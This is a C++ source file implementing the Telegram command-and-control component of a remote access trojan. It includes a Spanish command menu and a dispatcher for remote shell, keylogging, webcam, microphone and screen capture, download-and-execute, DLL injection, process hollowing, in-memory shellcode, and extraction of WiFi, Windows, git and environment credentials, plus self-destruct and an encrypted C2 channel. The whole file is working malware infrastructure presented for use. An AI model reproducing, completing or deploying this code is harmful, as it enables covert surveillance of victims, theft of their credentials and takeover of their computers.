#include "infrastructure/telegram/TelegramBot.hpp"

#include <algorithm>
#include <sstream>

#include <curl/curl.h>
#include <nlohmann/json.hpp>

#include "domain/common/StringTable.hpp"
#include "application/commands/CommandHandler.hpp"
#include "application/commands/MediaHandler.hpp"
#include "application/commands/LocationHandler.hpp"
#include "application/commands/ShellHandler.hpp"
#include "application/commands/SysInfoHandler.hpp"
#include "application/commands/ClipboardHandler.hpp"
#include "application/commands/ProcessHandler.hpp"
#include "application/commands/WifiHandler.hpp"
#include "application/commands/FileManagerHandler.hpp"
#include "application/commands/DownloadExecHandler.hpp"
#include "application/commands/KeywordAlertHandler.hpp"
#include "application/commands/InjectHandler.hpp"
#include "application/commands/SelfDestructHandler.hpp"
#include "application/commands/CredentialHandler.hpp"

namespace nuub::infrastructure::telegram {

using json = nlohmann::json;

static size_t write_callback(char* ptr, size_t size, size_t nmemb, std::string* data) {
    data->append(ptr, size * nmemb);
    return size * nmemb;
}

TelegramBot::TelegramBot(std::string token, std::int64_t admin_chat_id, std::string pc_id)
    : token_(std::move(token))
    , admin_(admin_chat_id)
    , pc_id_(std::move(pc_id))
    , reporter_(token_, admin_chat_id, pc_id_)
    , heartbeat_([this](const std::string& msg) { reporter_.send_message(msg); },
                 pc_id_, 30)
{
}

TelegramBot::TelegramBot(std::string token, std::vector<std::int64_t> admin_chat_ids, std::string pc_id)
    : token_(std::move(token))
    , admin_(std::move(admin_chat_ids))
    , pc_id_(std::move(pc_id))
    , reporter_(token_, admin_.chat_ids(), pc_id_)
    , heartbeat_([this](const std::string& msg) { reporter_.send_message(msg); },
                 pc_id_, 30)
{
}

TelegramBot::TelegramBot(std::string token, std::vector<std::int64_t> admin_chat_ids,
                         std::string pc_id, const std::string& c2_encryption_key)
    : token_(std::move(token))
    , admin_(std::move(admin_chat_ids))
    , pc_id_(std::move(pc_id))
    , reporter_(token_, admin_.chat_ids(), pc_id_, c2_encryption_key)
    , heartbeat_([this](const std::string& msg) { reporter_.send_message(msg); },
                 pc_id_, 30)
{
}

TelegramBot::TelegramBot(std::string token, domain::entities::Admin admin,
                         std::string pc_id, const std::string& c2_encryption_key)
    : token_(std::move(token))
    , admin_(std::move(admin))
    , pc_id_(std::move(pc_id))
    , reporter_(token_, this->admin_.chat_ids(), this->pc_id_, c2_encryption_key)
    , heartbeat_([this](const std::string& msg) { reporter_.send_message(msg); },
                 pc_id_, 30)
{
}

TelegramBot::~TelegramBot() {
    stop();
}

void TelegramBot::set_handlers(
    application::commands::CommandHandler& cmd,
    application::commands::MediaHandler& media,
    application::commands::LocationHandler& loc,
    application::commands::ShellHandler& shell,
    application::commands::SysInfoHandler& sysinfo,
    application::commands::ClipboardHandler& clipboard,
    application::commands::ProcessHandler& process,
    application::commands::WifiHandler& wifi,
    application::commands::FileManagerHandler& filemgr,
    application::commands::DownloadExecHandler& dl,
    application::commands::KeywordAlertHandler& alert,
    application::commands::InjectHandler& inject,
    application::commands::SelfDestructHandler& uninstall,
    application::commands::CredentialHandler& credential)
{
    cmd_handler_ = &cmd;
    media_handler_ = &media;
    loc_handler_ = &loc;
    shell_handler_ = &shell;
    sysinfo_handler_ = &sysinfo;
    clipboard_handler_ = &clipboard;
    process_handler_ = &process;
    wifi_handler_ = &wifi;
    filemgr_handler_ = &filemgr;
    dl_handler_ = &dl;
    alert_handler_ = &alert;
    inject_handler_ = &inject;
    uninstall_handler_ = &uninstall;
    credential_handler_ = &credential;
}

void TelegramBot::set_audit_log(const std::string& path) {
    audit_ = std::make_unique<domain::AuditLogger>(path);
}

std::string TelegramBot::handle_help() {
    return "Comandos disponibles:\n\n"
           "[Lectura]\n"
           "  /status <target> - Estado del agente\n"
           "  /sysinfo <target> - Info del sistema\n"
           "  /ps <target> - Lista de procesos\n"
           "  /ls <target> <path> - Listar archivos\n"
           "  /cat <target> <path> - Leer archivo\n"
           "  /clipboard <target> - Portapapeles\n"
           "  /locate <target> - Ubicacion IP\n"
           "  /info <target> - Info detallada\n"
           "  /alerts - Ver keywords activas\n\n"
           "[Medio]\n"
           "  /shell <target> <cmd> - Ejecutar comando\n"
           "  /wifi <target> - Passwords WiFi\n"
           "  /getlog <target> - Log de teclas\n"
           "  /mkdir <target> <path> - Crear carpeta\n"
           "  /setclip <target> <text> - Sets portapapeles\n"
           "  /take_photo <target> - Foto camara\n"
           "  /screenshot <target> - Captura pantalla\n"
           "  /record_audio <target> <seg> - Grabar audio\n"
           "  /send <target> <path> - Enviar archivo\n"
           "  /alert <target> <word> - Alerta keyword\n"
           "  /unalert <target> <word> - Quitar alerta\n\n"
           "[Admin]\n"
           "  /kill <target> <pid> - Matar proceso\n"
           "  /rm <target> <path> - Eliminar archivo\n"
           "  /downloadexec <target> <url> - Descargar y ejecutar\n"
           "  /take_video <target> <seg> - Grabar video\n"
           "  /screenrecord <target> <seg> - Grabar pantalla\n"
           "  /inject <target> <pid> <url> - Inyectar DLL en proceso\n"
           "  /hollow <target> <exe> - Process hollowing\n"
           "  /shellcode <target> <url> - Ejecutar shellcode en memoria\n"
           "  /creds <target> - Extraer todas las credenciales\n"
           "  /wifi_creds <target> - Contraseñas WiFi\n"
           "  /win_creds <target> - Windows Credential Manager\n"
           "  /env_creds <target> - Variables de entorno (API keys)\n"
           "  /git_creds <target> - Credenciales de git\n"
           "  /uninstall <target> - Auto-destruccion\n"
           "  /shutdown <target> - Apagar agente\n\n"
           "[Util]\n"
           "  /help - Esta ayuda\n"
           "  /agents - Ver PCs conectadas";
}

std::string TelegramBot::api_call(const std::string& method, const std::string& params) {
    std::string tg_api = domain::StringTable::get("tg_api");
    std::string url = tg_api + token_ + "/" + method;
    std::string response;

    CURL* curl = curl_easy_init();
    if (!curl) return {};

    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 2L);

    if (!params.empty()) {
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, params.c_str());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, params.size());
    }

    CURLcode res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);

    return (res == CURLE_OK) ? response : "";
}

void TelegramBot::dispatch(std::int64_t chat_id, const std::string& command,
                           const std::string& target, int duration, const std::string& extra) {
    // Check permission before executing
    if (!admin_.can_execute(chat_id, command)) {
        std::string perm_name = admin_.get_permission_name(chat_id);
        std::string msg = "Acceso denegado. Tu nivel (" + perm_name +
                         ") no permite /" + command;
        reporter_.send_message(msg);

        if (audit_) {
            audit_->log_denied(chat_id, perm_name, command);
        }
        return;
    }

    // Log the command
    if (audit_) {
        audit_->log_command(
            admin_.get_permission_name(chat_id) + "@" + std::to_string(chat_id),
            chat_id,
            admin_.get_permission_name(chat_id),
            command, target, extra, true);
    }

    // Dispatch
    if (command == "start")        { if (cmd_handler_) cmd_handler_->handle_start(target); }
    else if (command == "status")  { if (cmd_handler_) cmd_handler_->handle_status(target); }
    else if (command == "pause")   { if (cmd_handler_) cmd_handler_->handle_pause(target); }
    else if (command == "resume")  { if (cmd_handler_) cmd_handler_->handle_resume(target); }
    else if (command == "getlog")  { if (cmd_handler_) cmd_handler_->handle_getlog(target); }
    else if (command == "shutdown") { if (cmd_handler_) cmd_handler_->handle_shutdown(target); }
    else if (command == "info")    { if (cmd_handler_) cmd_handler_->handle_info(target); }
    else if (command == "help")    { reporter_.send_message(handle_help()); }
    else if (command == "agents")  { reporter_.send_message("PC activa: " + pc_id_); }
    // Media
    else if (command == "take_photo")   { if (media_handler_) media_handler_->handle_take_photo(target); }
    else if (command == "take_video")   { if (media_handler_) media_handler_->handle_take_video(target, duration); }
    else if (command == "record_audio") { if (media_handler_) media_handler_->handle_record_audio(target, duration); }
    else if (command == "screenshot")   { if (media_handler_) media_handler_->handle_screenshot(target); }
    else if (command == "screenrecord") { if (media_handler_) media_handler_->handle_screenrecord(target, duration); }
    // Location
    else if (command == "locate")  { if (loc_handler_) loc_handler_->handle_locate(target); }
    // Shell
    else if (command == "shell")   { if (shell_handler_) shell_handler_->handle_shell(target, extra); }
    // Sysinfo
    else if (command == "sysinfo") { if (sysinfo_handler_) sysinfo_handler_->handle_sysinfo(target); }
    // Clipboard
    else if (command == "clipboard") { if (clipboard_handler_) clipboard_handler_->handle_clipboard(target); }
    else if (command == "setclip") { if (clipboard_handler_) clipboard_handler_->handle_setclip(target, extra); }
    // Process
    else if (command == "ps")      { if (process_handler_) process_handler_->handle_ps(target); }
    else if (command == "kill")    { if (process_handler_) process_handler_->handle_kill(target, extra); }
    // WiFi
    else if (command == "wifi")    { if (wifi_handler_) wifi_handler_->handle_wifi(target); }
    // File manager
    else if (command == "ls")      { if (filemgr_handler_) filemgr_handler_->handle_ls(target, extra); }
    else if (command == "mkdir")   { if (filemgr_handler_) filemgr_handler_->handle_mkdir(target, extra); }
    else if (command == "rm")      { if (filemgr_handler_) filemgr_handler_->handle_rm(target, extra); }
    else if (command == "cat")     { if (filemgr_handler_) filemgr_handler_->handle_cat(target, extra); }
    else if (command == "send")    { if (filemgr_handler_) filemgr_handler_->handle_send(target, extra); }
    // Download & execute
    else if (command == "downloadexec") { if (dl_handler_) dl_handler_->handle_downloadexec(target, extra); }
    // Keyword alerts
    else if (command == "alert")   { if (alert_handler_) alert_handler_->handle_add_alert(target, extra); }
    else if (command == "unalert") { if (alert_handler_) alert_handler_->handle_remove_alert(target, extra); }
    else if (command == "alerts")  { if (alert_handler_) alert_handler_->handle_list_alerts(target); }
    // Injection commands
    else if (command == "inject")    { if (inject_handler_) inject_handler_->handle_inject(target, extra); }
    else if (command == "hollow")    { if (inject_handler_) inject_handler_->handle_hollow(target, extra); }
    else if (command == "shellcode") { if (inject_handler_) inject_handler_->handle_shellcode(target, extra); }
    // Self-destruct
    else if (command == "uninstall") { if (uninstall_handler_) uninstall_handler_->handle_uninstall(target, config_path_, auto_start_name_); }
    // Credential commands
    else if (command == "creds")     { if (credential_handler_) credential_handler_->handle_creds(target); }
    else if (command == "wifi_creds") { if (credential_handler_) credential_handler_->handle_wifi_creds(target); }
    else if (command == "env_creds") { if (credential_handler_) credential_handler_->handle_env_creds(target); }
    else if (command == "win_creds") { if (credential_handler_) credential_handler_->handle_win_creds(target); }
    else if (command == "git_creds") { if (credential_handler_) credential_handler_->handle_git_creds(target); }
}

void TelegramBot::poll_loop() {
    while (running_) {
        std::string offset_param = "offset=" + std::to_string(last_update_id_ + 1);
        std::string resp = api_call("getUpdates", offset_param + "&timeout=5");

        if (resp.empty()) {
            std::this_thread::sleep_for(std::chrono::seconds(2));
            continue;
        }

        try {
            auto data = json::parse(resp);
            if (!data["ok"]) continue;

            for (const auto& update : data["result"]) {
                last_update_id_ = update["update_id"].get<std::int64_t>();

                auto& msg = update["message"];
                if (!msg.contains("text")) continue;

                auto chat = msg["chat"];
                std::int64_t chat_id = chat["id"].get<std::int64_t>();
                if (!admin_.is_authorized(chat_id)) continue;

                std::string text = msg["text"].get<std::string>();
                if (text.empty() || text[0] != '/') continue;

                // Parse /command target extra_args
                std::istringstream iss(text);
                std::string cmd_with_slash, target;
                int duration = 10;

                iss >> cmd_with_slash;
                std::string command = cmd_with_slash.substr(1);
                std::transform(command.begin(), command.end(), command.begin(), ::tolower);

                if (iss >> target) {
                    std::transform(target.begin(), target.end(), target.begin(), ::tolower);
                }
                if (iss >> duration) { /* parsed */ }

                std::string extra;
                std::getline(iss, extra);
                if (!extra.empty() && extra[0] == ' ') {
                    extra = extra.substr(1);
                }

                dispatch(chat_id, command, target, duration, extra);
            }
        } catch (const std::exception&) {
            std::this_thread::sleep_for(std::chrono::seconds(2));
        }
    }
}

void TelegramBot::start() {
    running_ = true;

    if (audit_) audit_->log_event("AGENT_START pc=" + pc_id_);

    reporter_.send_message("Agente conectado y activo.");

    poll_thread_ = std::thread(&TelegramBot::poll_loop, this);
    heartbeat_.start();
}

void TelegramBot::stop() {
    running_ = false;
    if (audit_) audit_->log_event("AGENT_STOP pc=" + pc_id_);
    heartbeat_.stop();
    if (poll_thread_.joinable()) {
        poll_thread_.join();
    }
}

} // namespace nuub::infrastructure::telegram
